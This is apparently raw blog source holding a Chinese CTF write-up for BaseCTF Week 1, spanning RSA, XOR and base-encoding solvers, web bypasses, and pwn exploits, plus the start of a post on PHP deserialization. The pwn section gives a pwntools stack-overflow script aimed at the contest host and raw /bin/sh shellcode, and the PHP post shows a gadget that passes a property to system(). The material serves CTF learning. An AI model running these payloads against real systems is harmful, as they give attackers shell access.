+<h2 id="Week1-捂住X只耳"><a href="#Week1-捂住X只耳" class="headerlink" title="[Week1] 捂住X只耳"></a>[Week1] 捂住X只耳</h2><h2 id="Week1-倒计时？海报！（包括公开版和公开前）"><a href="#Week1-倒计时？海报！（包括公开版和公开前）" class="headerlink" title="[Week1] 倒计时？海报！（包括公开版和公开前）"></a>[Week1] 倒计时？海报！（包括公开版和公开前）</h2><h2 id="Week1-签到！DK-盾！"><a href="#Week1-签到！DK-盾！" class="headerlink" title="[Week1] 签到！DK 盾！"></a><strong>[Week1] 签到！DK 盾！</strong></h2><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Week1-ez-rsa"><a href="#Week1-ez-rsa" class="headerlink" title="[Week1] ez_rsa"></a>[Week1] ez_rsa</h2><p>题目给了n e c 还有not_phi&#x3D;(p+2)<em>(q+2)&#x3D;p<code>*</code>q+2p+2q+4<br>要算出私钥d就要算出n的欧拉函数<br>n的欧拉函数是(p-1)</em>(q-1)&#x3D;p<code>*</code>q-p-q+1</p>
+<p>n &#x3D; p<code>*</code>q<br>所以这是初中生就能解决的因式问题</p>
+<p>n的欧拉函数 &#x3D; (not_phi-n-4)&#x2F;&#x2F;2</p>
+<p>得到欧拉函数就可以用模逆元算d</p>
+<p>有c d n就有明文</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line">from sympy import mod_inverse  </span><br><span class="line"></span><br><span class="line">e=65537</span><br><span class="line">c=37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span><br><span class="line">not_phi = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span><br><span class="line">n = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span><br><span class="line"></span><br><span class="line">pplusq=(not_phi-n-4)//2</span><br><span class="line">phi=n+1-pplusq</span><br><span class="line">d = mod_inverse(e, phi)</span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Week1-babypack"><a href="#Week1-babypack" class="headerlink" title="[Week1] babypack"></a>[Week1] babypack</h2><p>加密脚本的过程大概是</p>
+<ol>
+<li>把flag转换为2进制</li>
+<li>创建一个随机数列表a,可以观察到每个随机数必然是后一个的两倍多一点</li>
+<li>然后看flag的2进制中的每一位是不是1,如果是则将随机数列表里对应数加到变量c上</li>
+</ol>
+<p>我们有的是a和c<br>那么就可以让a[i]和c比大小,判断第i+1位是不是1</p>
+<p>总之exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># a = ···</span><br><span class="line"># c = ···</span><br><span class="line"></span><br><span class="line">for i in a:</span><br><span class="line">    if c&gt;i:</span><br><span class="line">        c-=i</span><br><span class="line">        print(1,end=&#x27;&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(0,end=&#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">flag=0b10000100110000101110011011001010100001101010100010001100111101100110010011000110011010001100010001100000110001100110001001101010010110100110011011000100110010101100101001011010011010001100101001101000110000100101101011000100110010100110110011001010010110100110000011001100011001000110001011001010011010000110100011000100110010000110100011000110011100101111100</span><br><span class="line">print(libnum.n2s(flag))</span><br></pre></td></tr></table></figure>
+
+<h2 id="Week1-babyrsa"><a href="#Week1-babyrsa" class="headerlink" title="[Week1] babyrsa"></a>[Week1] babyrsa</h2><p>rsa算法,但是没有p和q,直接取n<br>我猜n大概率是素数,所以直接算它的欧拉函数</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import libnum</span><br><span class="line">from sympy import mod_inverse  </span><br><span class="line"></span><br><span class="line">n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br><span class="line">e = 65537</span><br><span class="line">c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><span class="line">phi = n-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = mod_inverse(e, phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Week1-十七倍"><a href="#Week1-十七倍" class="headerlink" title="[Week1] 十七倍"></a><strong>[Week1] 十七倍</strong></h2><p>明文m转秘文c的算式为<br>m*17%256&#x3D;c</p>
+<p>那么 m&#x3D;c*17关于256的模逆元%256<br>可以很容易的知道是241</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cipher = [</span><br><span class="line">         98, 113, 163, 181, 115, 148, 166,  43,   9,  95,</span><br><span class="line">        165, 146,  79, 115, 146, 233, 112, 180,  48,  79,</span><br><span class="line">         65, 181, 113, 146,  46, 249,  78, 183,  79, 133,</span><br><span class="line">        180, 113, 146, 148, 163,  79,  78,  48, 231,  77</span><br><span class="line">] </span><br><span class="line"></span><br><span class="line">for int in cipher:</span><br><span class="line">    print(chr(int),end=&#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">print()</span><br><span class="line">for i in range(len(cipher)):</span><br><span class="line">    cipher[i] = (cipher[i]*241) % 256</span><br><span class="line"></span><br><span class="line">for int in cipher:</span><br><span class="line">    print(chr(int),end=&#x27;&#x27;)</span><br><span class="line">  </span><br><span class="line"># 或者，如果你不想使用预定义的逆元  </span><br><span class="line"># x = solve_modular_equation(y, multiplier=17, modulus=256)  </span><br><span class="line"># print(f&quot;x = &#123;x&#125;&quot;)  # 同样应该输出 x = 148</span><br></pre></td></tr></table></figure>
+<h2 id="Week1-helloCrypto"><a href="#Week1-helloCrypto" class="headerlink" title="[Week1] helloCrypto"></a><strong>[Week1] helloCrypto</strong></h2><p>很简单的一道<br>aes是对称加密,即然key给了就能直接解</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line">import random</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">key = libnum.n2s(208797759953288399620324890930572736628)</span><br><span class="line">my_aes=AES.new(key=key,mode=AES.MODE_ECB)</span><br><span class="line">c = b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br><span class="line"></span><br><span class="line">decrypted_padded = my_aes.decrypt(c)  </span><br><span class="line"></span><br><span class="line">print(decrypted_padded)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Week1-你会算md5吗"><a href="#Week1-你会算md5吗" class="headerlink" title="[Week1] 你会算md5吗"></a><strong>[Week1] 你会算md5吗</strong></h2><p>题目的加密过程,是将flag里的每一个字符都单独拎出来算一遍md5<br>那么只要把ascii表上的字符都算一遍做成字典,然后和密文撞就行了</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib  </span><br><span class="line">import string  </span><br><span class="line">  </span><br><span class="line">def build_md5_dict():  </span><br><span class="line">    md5_dict = &#123;&#125;  </span><br><span class="line">    characters = string.ascii_letters + string.digits + string.punctuation  </span><br><span class="line">    for char in characters:  </span><br><span class="line">        md5_hash = hashlib.md5(char.encode()).hexdigest()  </span><br><span class="line">        md5_dict[md5_hash] = char  </span><br><span class="line">    return md5_dict  </span><br><span class="line">  </span><br><span class="line"># 构建并打印MD5字典（注意：这里只打印了一部分以节省空间）  </span><br><span class="line">md5_dict = build_md5_dict()  </span><br><span class="line">  </span><br><span class="line"># 注意：由于MD5的哈希冲突可能性极低（但不为0），我们假设在这个小字符集中没有冲突。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def recover_string_from_md5_list(md5_list, md5_dict):  </span><br><span class="line">    recovered_string = &quot;&quot;  </span><br><span class="line">    for md5_hash in md5_list:  </span><br><span class="line">        if md5_hash in md5_dict:  </span><br><span class="line">            recovered_string += md5_dict[md5_hash]  </span><br><span class="line">        else:  </span><br><span class="line">            # 如果MD5列表中包含未知的MD5值，可以选择跳过或抛出异常  </span><br><span class="line">            recovered_string += &quot;?&quot;  </span><br><span class="line">    return recovered_string  </span><br><span class="line">  </span><br><span class="line"># 示例MD5列表  </span><br><span class="line">md5_list = [&#x27;9d5ed678fe57bcca610140957afab571&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;0d61f8370cad1d412f80b84d143e1257&#x27;, &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;, &#x27;800618943025315f869e4e1f09471012&#x27;, &#x27;f95b70fdc3088560732a5ac135644506&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;, &#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"># 使用步骤1中生成的md5_dict来恢复字符串  </span><br><span class="line">recovered_string = recover_string_from_md5_list(md5_list, md5_dict)  </span><br><span class="line">print(recovered_string)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a><strong>[Week1] HTTP 是什么呀</strong></h2><p>满足题目所有要求<br><img src="/2024/08/18/basectf-week1-wp/web_1_1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/web_1_2.png" alt="text"> </p>
+<p>就能在网络包里发现flag<br><img src="/2024/08/18/basectf-week1-wp/web_1_3.png" alt="text"> </p>
+<h2 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•&#96;"></a>[Week1] 喵喵喵´•ﻌ•&#96;</h2><p>easy<br><img src="/2024/08/18/basectf-week1-wp/web_2.png" alt="alt text"></p>
+<h2 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h2><p>md5函数不能接受数组<br>会返回false<br>弱比较和强比较都能绕<br><img src="/2024/08/18/basectf-week1-wp/web_3.png" alt="alt text"></p>
+<h2 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a><strong>[Week1] A Dark Room</strong></h2><p>我也玩过<br>flag在注释里<br><img src="/2024/08/18/basectf-week1-wp/web_4.png" alt="alt text"></p>
+<h2 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h2><p>直接传马上去就行了<br><img src="/2024/08/18/basectf-week1-wp/web_5_1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/web_5_2.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/web_5_3.png" alt="text"></p>
+<h2 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h2><p>pen检查用伪协议data%3A%2F%2Ftext%2Fplain%3Bbase64%2CQXVyYQ%3D%3D过<br>challenge难点</p>
+<ol>
+<li>需要以<a href="http://jasmineaura.github.io开头/">http://jasmineaura.github.io开头</a></li>
+<li>需要让访问到的内容包含已经收到Kengwang的礼物啦</li>
+</ol>
+<p>而这个网页指向的博客,在题目开始的时候,有一篇文章却是包含了已经收到Kengwang的礼物啦<br>但后来被删了,我没来得及蹭到<br>所以通过url的奇妙结构<br><a href="http://jasmineaura.github.io@truthleader.github.io/">http://jasmineaura.github.io@truthleader.github.io</a></p>
+<p>@后面的才会被当作域名解析<br>然后用gift直接包含得不到flag,所以用任意文件读取的伪协议<br><img src="/2024/08/18/basectf-week1-wp/web_6_1.png" alt="alt text"> </p>
+<p>base64解密<br><img src="/2024/08/18/basectf-week1-wp/web_6_2.png" alt="alt text"></p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Week1-签个到吧"><a href="#Week1-签个到吧" class="headerlink" title="[Week1] 签个到吧"></a><strong>[Week1] 签个到吧</strong></h2><p>nc challenge.basectf.fun 32200<br>cat &#x2F;flag直接有</p>
+<p><img src="/2024/08/18/basectf-week1-wp/pwn_qiandao.png"></p>
+<h2 id="Week1-echo"><a href="#Week1-echo" class="headerlink" title="[Week1] echo"></a><strong>[Week1] echo</strong></h2><p>用echo打印flag<br><img src="/2024/08/18/basectf-week1-wp/pwn_echo.png"></p>
+<h2 id="Week1-Ret2text"><a href="#Week1-Ret2text" class="headerlink" title="[Week1] Ret2text"></a><strong>[Week1] Ret2text</strong></h2><p>可以看到shell的地址<br><img src="/2024/08/18/basectf-week1-wp/pwn_ret2text1.png" alt="alt text"><br>而字符串大小为32<br><img src="/2024/08/18/basectf-week1-wp/pwn_ret2text2.png" alt="alt text"></p>
+<p>也就是32+8位数据填充实现栈溢出,然后用shell地址覆盖ret地址<br>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">sh = remote(&#x27;challenge.basectf.fun&#x27;,31868)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;0&#x27;*(32+8)+p64(0x4011BB)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Week1-shellcode-level0"><a href="#Week1-shellcode-level0" class="headerlink" title="[Week1] shellcode_level0"></a>[Week1] shellcode_level0</h2><p>用pwntools喵喵工具生成shellcode,直接出<br><img src="/2024/08/18/basectf-week1-wp/pwn_shellcode1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/pwn_shellcode2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/pwn_shellcode3.png" alt="alt text"> </p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">sh = process(&#x27;./shellcode_level0&#x27;)</span><br><span class="line">elf = ELF(&#x27;./shellcode_level0&#x27;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Week1-我把她丢了"><a href="#Week1-我把她丢了" class="headerlink" title="[Week1] 我把她丢了"></a>[Week1] 我把她丢了</h2><p>栈溢出的残缺后门+nx保护<br>不太懂,上网照喵画虎弄出来的<br><img src="/2024/08/18/basectf-week1-wp/pwn_wbtdl1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/pwn_wbtdl2.png" alt="alt text"></p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Week1-You-are-good-at-IDA"><a href="#Week1-You-are-good-at-IDA" class="headerlink" title="[Week1] You are good at IDA"></a><strong>[Week1] You are good at IDA</strong></h2><p>ida拖进去看的三个函数,有flag的三部分,拼起来就好了<br><img src="/2024/08/18/basectf-week1-wp/reverse_ezida3.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_ezida1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_ezida2.png" alt="text"></p>
+<h2 id="Week1-UPX-mini"><a href="#Week1-UPX-mini" class="headerlink" title="[Week1] UPX mini"></a><strong>[Week1] UPX mini</strong></h2><p>用upx妙妙工具解壳,<br>然后就看到了base秘文<br>用cyberchef妙妙工具得flag<br><img src="/2024/08/18/basectf-week1-wp/reverse_upx1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_upx2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_upx3.png" alt="alt text"></p>
+<h2 id="Week1-ez-maze"><a href="#Week1-ez-maze" class="headerlink" title="[Week1] ez_maze"></a>[Week1] ez_maze</h2><p>迷宫题<br>找到了地图和长宽数据<br><img src="/2024/08/18/basectf-week1-wp/reverse_maze1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_maze2.png" alt="text"> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x$$$$$$$$$$$$$$</span><br><span class="line">&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$</span><br><span class="line">&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$</span><br><span class="line">&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$</span><br><span class="line">&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$</span><br><span class="line">&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$</span><br><span class="line">&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$</span><br><span class="line">&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$</span><br><span class="line">$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$</span><br><span class="line">$$$$$$&amp;$$$$$$$$</span><br><span class="line">$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$</span><br><span class="line">$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$</span><br><span class="line">$$$$$$$$$&amp;$$&amp;$$</span><br><span class="line">$$$$$$$$$&amp;$&amp;$$$</span><br><span class="line">$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y</span><br></pre></td></tr></table></figure>
+
+<p>&amp;是路,$是墙,用最短路线走到y<br><img src="/2024/08/18/basectf-week1-wp/reverse_maze3.png" alt="alt text"><br>然后转md5就是flag了</p>
+<h2 id="Week1-Ez-Xor"><a href="#Week1-Ez-Xor" class="headerlink" title="[Week1] Ez Xor"></a>[Week1] Ez Xor</h2><p>用ida看到如下内容<br><img src="/2024/08/18/basectf-week1-wp/re_ezxor1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_ezxor2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_ezxor3.png" alt="alt text"> </p>
+<p>这段程序通过keystream函数生成了长度为28的key<br>然后通过encrypt函数对用户的输入进行xor运算<br>然后通过checkflag函数将加密后的用户输入和str比较</p>
+<p>由于</p>
+<ol>
+<li>key是固定生成的</li>
+<li>xor的逆运算是再xor一遍<br>所以能够用c将keystream 和 encrypt实现<br>将str作为输入<br>就能得到flag了</li>
+</ol>
+<p>str如下<br><img src="/2024/08/18/basectf-week1-wp/re_ezxor4.png" alt="alt text"> </p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt(int *v14,int *str,int v17)&#123;</span><br><span class="line">    for (int i=0;i&lt;v17;i++)&#123;</span><br><span class="line">        printf(&quot;%d&quot;, str[i]);</span><br><span class="line">        str[i]=str[i]^v14[v17-i-1];</span><br><span class="line">        printf(&quot;%d %d\n&quot;,str[i], v14[v17-i-1]);</span><br><span class="line">        // printf(&quot;%d&quot;,str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void KeyStream(int *v4,int *v14,int a3)&#123;</span><br><span class="line">    for (int i=0;i&lt;a3;i++)&#123;</span><br><span class="line">        v14[i]=i^v4[i%3];</span><br><span class="line">        // printf(&quot;%c&quot;,v14[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int v4[3]=&#123;&#x27;X&#x27;,&#x27;o&#x27;,&#x27;r&#x27;&#125;;</span><br><span class="line">    int v14[28]=&#123;88,110,112,91,107,119,94,104,122,81,101,121,84,98,124,87,127,99,74,124,102,77,121,101,64,118,104,67&#125;;</span><br><span class="line">    // int v14[28];</span><br><span class="line">    int v5[28];</span><br><span class="line">    int str[28]=&#123;1,9,5,&#x27;%&#x27;,&#x27;&amp;&#x27;,&#x27;-&#x27;,0x0B,0x1D,&#x27;$&#x27;,&#x27;z&#x27;,&#x27;1&#x27;,&#x27; &#x27;,0x1E,&#x27;I&#x27;,&#x27;=&#x27;,&#x27;g&#x27;,&#x27;M&#x27;,&#x27;P&#x27;,8,&#x27;%&#x27;,&#x27;.&#x27;,&#x27;n&#x27;,5,&#x27;4&#x27;,&#x27;\&quot;&#x27;,&#x27;@&#x27;,&#x27;;&#x27;,&#x27;%&#x27;&#125;;</span><br><span class="line">    KeyStream(&amp;v4,v14,28);</span><br><span class="line">    decrypt(v14,str,28);</span><br><span class="line"></span><br><span class="line">    // for(int i=0;i&lt;28;i++)&#123;</span><br><span class="line"></span><br><span class="line">    //     printf(&quot;%d,&quot;, v14[i]);</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;28;i++)&#123;</span><br><span class="line"></span><br><span class="line">        printf(&quot;%c&quot;, str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Week1-BasePlus"><a href="#Week1-BasePlus" class="headerlink" title="[Week1] BasePlus"></a>[Week1] BasePlus</h2><p>伪代码如下<br><img src="/2024/08/18/basectf-week1-wp/re_base1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_base2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_base3.png" alt="alt text"></p>
+<p>其加密逻辑大致是</p>
+<ol>
+<li>将用户的输入以3个字符为单位分组,不足的用0作为填充</li>
+<li>加载每个分组,通过<em>二进制运算</em>得到下标,通过secret字典产生4个密文</li>
+<li>最终的密文长度,就是分组数*4</li>
+</ol>
+<p>程序提供了加密后的flag<br>我们可以通过flag的每4个字符,和secret字典比对得到每4个下标</p>
+<p>这4个下标来自于明文的每3个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 一个字符有8bit</span><br><span class="line">(unsigned __int8)v15 &gt;&gt; 2 // 第一个字符的前6个bit</span><br><span class="line">(HIBYTE(v15) &gt;&gt; 4) | (16 * v15) &amp; 0x30 // 第二个字符的前4bit和第一个字符的后2bit</span><br><span class="line">(v16 &gt;&gt; 6) | (4 * HIBYTE(v15)) &amp; 0x3C // 第三个字符的前2个bit和第二哥字符的后4bit</span><br><span class="line">v16 &amp; 0x3F // 第三个字符的后6bit</span><br></pre></td></tr></table></figure>
+<p>总之,我们只要把所有的bit拼回去,就能得到flag</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag = &quot;lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!&quot;</span><br><span class="line">secret=&quot;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&quot;</span><br><span class="line">flag = list(flag)</span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    flag[i] = ord(flag[i]) ^ 0xE</span><br><span class="line"></span><br><span class="line">for i in range(0, len(flag),4):</span><br><span class="line">    a1=secret.index(chr(flag[i])) # v15 前6位 为00111111</span><br><span class="line">    a2=secret.index(chr(flag[i+1])) # v16的前4位和v15后2位为00001111和00110000</span><br><span class="line">    a3=secret.index(chr(flag[i+2])) # v16的后4位和v17的前2位00111100 00000011</span><br><span class="line">    a4=secret.index(chr(flag[i+3])) # v17的后6位00111111</span><br><span class="line">    v15_1 = (a2 &amp; 0b00110000)&gt;&gt;4</span><br><span class="line">    v15_2 = a1&lt;&lt; 2</span><br><span class="line">    v15 = v15_1 | v15_2</span><br><span class="line">    v16_1 = (a2 &amp; 0b00001111) &lt;&lt; 4</span><br><span class="line">    v16_2 = (a3&amp;0b00111100) &gt;&gt; 2</span><br><span class="line">    v16=v16_1|v16_2</span><br><span class="line">    v17_1=(a3&amp;0b00000011)&lt;&lt;6</span><br><span class="line">    v17_2=(a4 &amp; 0b00111111)</span><br><span class="line">    v17=v17_1|v17_2</span><br><span class="line"></span><br><span class="line">    print(chr(v15),end=&#x27;&#x27;)</span><br><span class="line">    print(chr(v16),end= &#x27;&#x27;)</span><br><span class="line">    print(chr(v17),end= &#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>writeup - basectf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>serialize_private_and_protected</title>
+    <url>/2024/09/01/serialize-private-and-protected/</url>
+    <content><![CDATA[<p>php反序列化如何同时处理private和protected类型的变量</p>
+<span id="more"></span>
+
+<h1 id="public"><a href="#public" class="headerlink" title="public"></a>public</h1><p>通常遇到的反序列化里所有类的成员都是public</p>
+<p>例:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    public $command;</span><br><span class="line"></span><br><span class="line">    function vuln($payload) &#123;</span><br><span class="line">        system($payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;vuln($this-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;command = &#x27;echo &quot;test&quot;&#x27;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这是一个非常简单的poc案例,假如实例的反序列化代码的成员类型是private或protected,这个代码就会失效</p>
+<h1 id="private"><a href="#private" class="headerlink" title="private"></a>private</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    private $command = &#x27;echo &quot;test&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    function vuln($payload) &#123;</span><br><span class="line">        system($payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;vuln($this-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">echo 